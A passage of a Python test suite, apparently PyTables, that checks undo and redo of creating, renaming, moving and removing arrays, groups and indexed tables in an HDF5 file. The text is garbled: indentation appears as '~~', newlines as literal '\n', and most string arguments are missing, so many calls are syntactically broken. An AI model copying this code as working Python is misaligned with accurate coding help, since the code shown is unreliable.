# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 1 , 2 ] , "Another array 1" ) \n 
self . h5file . create_array ( , , [ 2 , 3 ] , "Another array 2" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that otherarray does not exist in the object tree \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 1 , 2 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 2 , 3 ] ) \n 
\n 
~~ def test02 ( self ) : \n 
~~~ """Checking three actions.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 1 , 2 ] , "Another array 1" ) \n 
self . h5file . create_array ( , , [ 2 , 3 ] , "Another array 2" ) \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 3" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that otherarray does not exist in the object tree \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . title , "Another array 3" ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 1 , 2 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 2 , 3 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . read ( ) , [ 3 , 4 ] ) \n 
\n 
~~ def test03 ( self ) : \n 
~~~ """Checking three actions in different depth levels.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 1 , 2 ] , "Another array 1" ) \n 
self . h5file . create_array ( , , \n 
[ 2 , 3 ] , "Another array 2" ) \n 
self . h5file . create_array ( , , \n 
[ 3 , 4 ] , "Another array 3" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that otherarray does not exist in the object tree \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
self . assertTrue ( "/agroup/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3/otherarray3" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3/otherarray3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertEqual ( self . h5file . root . agroup . otherarray2 . title , \n 
"Another array 2" ) \n 
self . assertEqual ( self . h5file . root . agroup . agroup3 . otherarray3 . title , \n 
"Another array 3" ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 1 , 2 ] ) \n 
self . assertEqual ( self . h5file . root . agroup . otherarray2 . read ( ) , [ 2 , 3 ] ) \n 
self . assertEqual ( self . h5file . root . agroup . agroup3 . otherarray3 . read ( ) , \n 
[ 3 , 4 ] ) \n 
\n 
\n 
~~ ~~ class CreateGroupTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Test for create_group operations""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( CreateGroupTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
~~ def test00 ( self ) : \n 
~~~ """Checking one action.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new group \n 
self . h5file . create_group ( , , "Another group 1" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that othergroup1 does not exist in the object tree \n 
self . assertTrue ( "/othergroup1" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that othergroup1 has come back to life in a sane state \n 
self . assertTrue ( "/othergroup1" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . othergroup1 . _v_title , \n 
"Another group 1" ) \n 
\n 
~~ def test01 ( self ) : \n 
~~~ """Checking two actions.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new group \n 
self . h5file . create_group ( , , "Another group 1" ) \n 
self . h5file . create_group ( , , "Another group 2" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that othergroup does not exist in the object tree \n 
self . assertTrue ( "/othergroup1" not in self . h5file ) \n 
self . assertTrue ( "/othergroup2" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that othergroup* has come back to life in a sane state \n 
self . assertTrue ( "/othergroup1" in self . h5file ) \n 
self . assertTrue ( "/othergroup2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . othergroup1 . _v_title , \n 
"Another group 1" ) \n 
self . assertEqual ( self . h5file . root . othergroup2 . _v_title , \n 
"Another group 2" ) \n 
\n 
~~ def test02 ( self ) : \n 
~~~ """Checking three actions.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new group \n 
self . h5file . create_group ( , , "Another group 1" ) \n 
self . h5file . create_group ( , , "Another group 2" ) \n 
self . h5file . create_group ( , , "Another group 3" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that othergroup* does not exist in the object tree \n 
self . assertTrue ( "/othergroup1" not in self . h5file ) \n 
self . assertTrue ( "/othergroup2" not in self . h5file ) \n 
self . assertTrue ( "/othergroup3" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that othergroup* has come back to life in a sane state \n 
self . assertTrue ( "/othergroup1" in self . h5file ) \n 
self . assertTrue ( "/othergroup2" in self . h5file ) \n 
self . assertTrue ( "/othergroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . othergroup1 . _v_title , \n 
"Another group 1" ) \n 
self . assertEqual ( self . h5file . root . othergroup2 . _v_title , \n 
"Another group 2" ) \n 
self . assertEqual ( self . h5file . root . othergroup3 . _v_title , \n 
"Another group 3" ) \n 
\n 
~~ def test03 ( self ) : \n 
~~~ """Checking three actions in different depth levels.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new group \n 
self . h5file . create_group ( , , "Another group 1" ) \n 
self . h5file . create_group ( \n 
, , "Another group 2" ) \n 
self . h5file . create_group ( \n 
, , "Another group 3" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that othergroup* does not exist in the object tree \n 
self . assertTrue ( "/othergroup1" not in self . h5file ) \n 
self . assertTrue ( "/othergroup1/othergroup2" not in self . h5file ) \n 
self . assertTrue ( \n 
"/othergroup1/othergroup2/othergroup3" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that othergroup* has come back to life in a sane state \n 
self . assertTrue ( "/othergroup1" in self . h5file ) \n 
self . assertTrue ( "/othergroup1/othergroup2" in self . h5file ) \n 
self . assertTrue ( "/othergroup1/othergroup2/othergroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . othergroup1 . _v_title , \n 
"Another group 1" ) \n 
self . assertEqual ( self . h5file . root . othergroup1 . othergroup2 . _v_title , \n 
"Another group 2" ) \n 
self . assertEqual ( \n 
self . h5file . root . othergroup1 . othergroup2 . othergroup3 . _v_title , \n 
"Another group 3" ) \n 
\n 
\n 
~~ ~~ minRowIndex = 10 \n 
\n 
\n 
def populateTable ( where , name ) : \n 
~~~ """Create a table under where with name name""" \n 
\n 
class Indexed ( IsDescription ) : \n 
~~~ var1 = StringCol ( itemsize = 4 , dflt = b"" , pos = 1 ) \n 
var2 = BoolCol ( dflt = 0 , pos = 2 ) \n 
var3 = IntCol ( dflt = 0 , pos = 3 ) \n 
var4 = FloatCol ( dflt = 0 , pos = 4 ) \n 
\n 
~~ nrows = minRowIndex \n 
table = where . _v_file . create_table ( where , name , Indexed , "Indexed" , \n 
None , nrows ) \n 
for i in range ( nrows ) : \n 
~~~ table . row [ ] = str ( i ) \n 
\n 
\n 
table . row [ ] = i % 2 \n 
table . row [ ] = i \n 
table . row [ ] = float ( nrows - i - 1 ) \n 
table . row . append ( ) \n 
~~ table . flush ( ) \n 
\n 
# Index all entries: \n 
indexrows = table . cols . var1 . create_index ( ) \n 
indexrows = table . cols . var2 . create_index ( ) \n 
indexrows = table . cols . var3 . create_index ( ) \n 
\n 
# Do not index the var4 column \n 
# indexrows = table.cols.var4.create_index() \n 
if common . verbose : \n 
~~~ print ( "Number of written rows:" , nrows ) \n 
print ( "Number of indexed rows:" , table . cols . var1 . index . nelements ) \n 
print ( "Number of indexed rows(2):" , indexrows ) \n 
\n 
\n 
~~ ~~ class RenameNodeTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Test for rename_node operations""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( RenameNodeTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
# Create a table in root \n 
populateTable ( self . h5file . root , ) \n 
\n 
~~ def test00 ( self ) : \n 
~~~ """Checking rename_node (over Groups without children)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . rename_node ( , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that it does not exist in the object tree \n 
self . assertTrue ( "/agroup2" in self . h5file ) \n 
self . assertTrue ( "/agroup3" not in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup2 . _v_title , "Group title 2" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/agroup2" not in self . h5file ) \n 
self . assertTrue ( "/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup3 . _v_title , "Group title 2" ) \n 
\n 
~~ def test01 ( self ) : \n 
~~~ """Checking rename_node (over Groups with children)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . rename_node ( , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that it does not exist in the object tree \n 
self . assertTrue ( "/agroup" in self . h5file ) \n 
self . assertTrue ( "/agroup3" not in self . h5file ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/agroup" not in self . h5file ) \n 
self . assertTrue ( "/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup3 . _v_title , "Group title" ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup3/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup3/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup3/agroup3" in self . h5file ) \n 
\n 
~~ def test01b ( self ) : \n 
~~~ """Checking rename_node (over Groups with children 2)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01b..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . rename_node ( , ) \n 
self . h5file . rename_node ( , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that it does not exist in the object tree \n 
self . assertTrue ( "/agroup" in self . h5file ) \n 
self . assertTrue ( "/agroup4" not in self . h5file ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/agroup" not in self . h5file ) \n 
self . assertTrue ( "/agroup4" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup4 . _v_title , "Group title" ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup4/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup4/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup4/agroup3" in self . h5file ) \n 
\n 
~~ def test02 ( self ) : \n 
~~~ """Checking rename_node (over Leaves)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . rename_node ( , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that otherarray does not exist in the object tree \n 
self . assertTrue ( "/anarray" in self . h5file ) \n 
self . assertTrue ( "/anarray2" not in self . h5file ) \n 
self . assertEqual ( self . h5file . root . anarray . title , "Array title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/anarray" not in self . h5file ) \n 
self . assertTrue ( "/anarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . anarray2 . title , "Array title" ) \n 
\n 
~~ def test03 ( self ) : \n 
~~~ """Checking rename_node (over Tables)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . rename_node ( , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that table2 does not exist in the object tree \n 
self . assertTrue ( "/table" in self . h5file ) \n 
table = self . h5file . root . table \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
self . assertTrue ( "/table2" not in self . h5file ) \n 
self . assertEqual ( self . h5file . root . table . title , "Indexed" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that table2 has come back to life in a sane state \n 
self . assertTrue ( "/table" not in self . h5file ) \n 
self . assertTrue ( "/table2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . table2 . title , "Indexed" ) \n 
table = self . h5file . root . table2 \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
\n 
\n 
~~ ~~ class MoveNodeTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Tests for move_node operations""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( MoveNodeTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
# Create a table in root \n 
populateTable ( self . h5file . root , ) \n 
\n 
~~ def test00 ( self ) : \n 
~~~ """Checking move_node (over Leaf)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . move_node ( , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that it does not exist in the object tree \n 
self . assertTrue ( "/anarray" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3/anarray" not in self . h5file ) \n 
self . assertEqual ( self . h5file . root . anarray . title , "Array title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/anarray" not in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3/anarray" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . agroup3 . anarray . title , \n 
"Array title" ) \n 
\n 
~~ def test01 ( self ) : \n 
~~~ """Checking move_node (over Groups with children)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . move_node ( , , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that it does not exist in the object tree \n 
self . assertTrue ( "/agroup" in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup3" not in self . h5file ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/agroup" not in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup2 . agroup3 . _v_title , \n 
"Group title" ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup2/agroup3/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup3/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup3/agroup3" in self . h5file ) \n 
\n 
~~ def test01b ( self ) : \n 
~~~ """Checking move_node (over Groups with children 2)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01b..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . move_node ( , , ) \n 
self . h5file . move_node ( , , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that it does not exist in the object tree \n 
self . assertTrue ( "/agroup" in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup4" not in self . h5file ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup/agroup3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup . _v_title , "Group title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/agroup" not in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup4" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup2 . agroup4 . _v_title , \n 
"Group title" ) \n 
\n 
# Check that children are reachable \n 
self . assertTrue ( "/agroup2/agroup4/anarray1" in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup4/anarray2" in self . h5file ) \n 
self . assertTrue ( "/agroup2/agroup4/agroup3" in self . h5file ) \n 
\n 
~~ def test02 ( self ) : \n 
~~~ """Checking move_node (over Leaves)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . move_node ( , , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that otherarray does not exist in the object tree \n 
self . assertTrue ( "/anarray" in self . h5file ) \n 
self . assertTrue ( "/agroup2/anarray2" not in self . h5file ) \n 
self . assertEqual ( self . h5file . root . anarray . title , "Array title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/anarray" not in self . h5file ) \n 
self . assertTrue ( "/agroup2/anarray2" in self . h5file ) \n 
self . assertEqual ( \n 
self . h5file . root . agroup2 . anarray2 . title , "Array title" ) \n 
\n 
~~ def test03 ( self ) : \n 
~~~ """Checking move_node (over Tables)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . move_node ( , , ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that table2 does not exist in the object tree \n 
self . assertTrue ( "/table" in self . h5file ) \n 
self . assertTrue ( "/agroup2/table2" not in self . h5file ) \n 
table = self . h5file . root . table \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
self . assertEqual ( self . h5file . root . table . title , "Indexed" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that table2 has come back to life in a sane state \n 
self . assertTrue ( "/table" not in self . h5file ) \n 
self . assertTrue ( "/agroup2/table2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . agroup2 . table2 . title , "Indexed" ) \n 
table = self . h5file . root . agroup2 . table2 \n 
self . assertTrue ( table . cols . var1 . index is not None ) \n 
self . assertTrue ( table . cols . var2 . index is not None ) \n 
self . assertTrue ( table . cols . var3 . index is not None ) \n 
self . assertEqual ( table . cols . var1 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var2 . index . nelements , minRowIndex ) \n 
self . assertEqual ( table . cols . var3 . index . nelements , minRowIndex ) \n 
self . assertTrue ( table . cols . var4 . index is None ) \n 
\n 
\n 
~~ ~~ class RemoveNodeTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Test for remove_node operations""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( RemoveNodeTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
# Create a table in root \n 
populateTable ( self . h5file . root , ) \n 
\n 
~~ def test00 ( self ) : \n 
~~~ """Checking remove_node (over Leaf)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Delete an existing array \n 
self . h5file . remove_node ( ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that it does exist in the object tree \n 
self . assertTrue ( "/anarray" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . anarray . title , "Array title" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that array has gone again \n 
self . assertTrue ( "/anarray" not in self . h5file ) \n 
\n 
~~ def test00b ( self ) : \n 
~~~ """Checking remove_node (over several Leaves)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00b..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Delete a couple of arrays \n 
self . h5file . remove_node ( ) \n 
self . h5file . remove_node ( ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that arrays has come into life \n 
self . assertTrue ( "/anarray" in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . anarray . title , "Array title" ) \n 
self . assertEqual ( \n 
self . h5file . root . agroup . anarray2 . title , "Array title 2" ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that arrays has disappeared again \n 
self . assertTrue ( "/anarray" not in self . h5file ) \n 
self . assertTrue ( "/agroup/anarray2" not in self . h5file ) \n 
\n 
~~ def test00c ( self ) : \n 
~~~ """Checking remove_node (over Tables)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00c..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
